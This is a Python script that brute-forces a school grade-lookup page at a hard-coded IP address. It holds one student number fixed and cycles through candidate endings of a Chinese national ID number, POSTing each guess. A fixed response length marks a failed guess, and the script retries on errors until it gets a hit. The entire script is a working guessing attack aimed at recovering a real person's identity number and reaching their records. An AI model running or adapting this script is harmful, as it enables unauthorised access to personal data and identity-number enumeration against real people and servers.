import urllib.request
import time
import sys
def yJudge(num,id):
    #return False
    data = 'xh={xh}&sfzh={sfzh}'.format(sfzh=id,xh=num)
    data = data.encode('utf-8')
    request = urllib.request.Request('http://222.177.140.104//showStuQmcj.php')
    request.add_header("Content-Type", "application/x-www-form-urlencoded;charset=utf-8")
    try:
        f = urllib.request.urlopen(request, data)
        res = f.read()
        #print(len(res))#
        if len(res) == 29:
            return False
        else:
            return True
    except urllib.error.HTTPError as mye:
        print('ErrorCode: %s' % mye)  # <class 'urllib.error.HTTPError'>
        print('ErrorCode: %s' % mye.code)  
        print('ErrorCode: %s' % mye.read())  # 如果是404，依然能读取到content内容的
        print('restart!!{num}&{id} {t}'.format(num=num,id=id,t=time.ctime()),end='\r')
        sys.stdout.flush()
        yJudge(num,id);
    except urllib.error.URLError as mye:
        print('ErrorCode: %s' % mye)
        print('restart!!{num}&{id} {t}'.format(num=num,id=id,t=time.ctime()),end='\r')
        sys.stdout.flush()
        yJudge(num,id);
    except:
        #sys.stdout.write('\r')
        print('restart!!{num}&{id} {t}'.format(num=num,id=id,t=time.ctime()),end='\r')
        sys.stdout.flush()
        yJudge(num,id);
def main():
    num = 2017212047
    start = 10728
    end = 29220
    i = 0
    for id_head in range(start,end,2):
        #from 051840 only even
        for id_tail in ['0','1','2','3','4','5','6','7','8','9','x']:
            i = i+1
            id = '{head:0>5}{tail}'.format(tail=id_tail,head=id_head)
            #print(id)
            if yJudge(num,id):
                print('Get!xh={xh}&sfzh={sfzh}'.format(sfzh=id,xh=num))
                return None
            else:
                print('Wrong,xh={xh}&sfzh={sfzh} {ratio:>8.4%} {t}'.format(sfzh=id,xh=num,ratio=2*i/(11*(end-start)),t=time.ctime()))
main()
